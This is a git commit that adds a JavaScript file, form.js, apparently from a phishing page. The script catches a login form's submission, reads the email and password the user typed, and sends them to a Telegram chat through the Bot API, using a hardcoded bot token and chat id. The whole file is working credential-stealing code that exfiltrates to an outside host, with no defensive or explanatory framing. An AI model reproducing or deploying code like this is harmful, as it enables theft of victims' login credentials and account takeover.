c4236f74358ba6526203abd79ff52ad4148378ec
carloweyk <carloweyk777@gmail.com>
2022-07-15 23:41:00 +0500

    first commit

---
+++ form.js
@@ -0,0 +1,24 @@
+const form = document.querySelector('form')
+
+form.addEventListener("submit", (event) => {
+  event.preventDefault() ;
+
+  var text1 = document.getElementById("email").value;
+  var text2 = document.getElementById("password").value;
+
+
+  var token = "5581556739:AAF1dhcL75uabSxgVqPK1SeztTL9AUGXns0"
+
+  var my_text = `Result is: 0%A - Email: ${text1} 0%A Password: ${text2}`
+
+  var chat_id = -1001713589407
+
+  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}/parse_mode=html/`
+
+
+  var api = new XMLHttpRequest()
+  api.open("GET",url,true);
+  api.send();
+
+  console.log("succesfully sended");
+})
